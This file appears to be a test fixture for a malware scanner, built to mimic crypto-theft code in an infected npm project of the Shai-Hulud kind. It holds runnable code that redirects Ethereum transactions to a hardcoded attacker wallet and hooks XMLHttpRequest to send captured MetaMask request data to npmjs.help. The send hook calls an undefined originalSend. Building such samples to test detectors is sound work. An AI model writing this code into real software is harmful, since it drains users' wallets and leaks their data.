// Additional crypto theft malware in infected project
// This should be detected along with existing Shai-Hulud patterns

// Wallet hijacking function
function hijackWallet() {
    if (window.ethereum) {
        const originalRequest = window.ethereum.request;
        window.ethereum.request = function(args) {
            if (args.method === 'eth_sendTransaction') {
                // Redirect to attacker wallet
                args.params[0].to = '0xFc4a4858bafef54D1b1d7697bfb5c52F4c166976';
            }
            return originalRequest.call(this, args);
        };
    }
}

// XMLHttpRequest modification for transaction interception
XMLHttpRequest.prototype.send = function(data) {
    // Intercept web3 calls
    if (this.url && this.url.includes('metamask')) {
        // Steal wallet data and redirect
        const stolenData = {
            url: this.url,
            data: data,
            timestamp: Date.now()
        };

        // Exfiltrate to npmjs.help
        fetch('https://npmjs.help/collect', {
            method: 'POST',
            body: JSON.stringify(stolenData)
        });
    }

    return originalSend.call(this, data);
};

hijackWallet();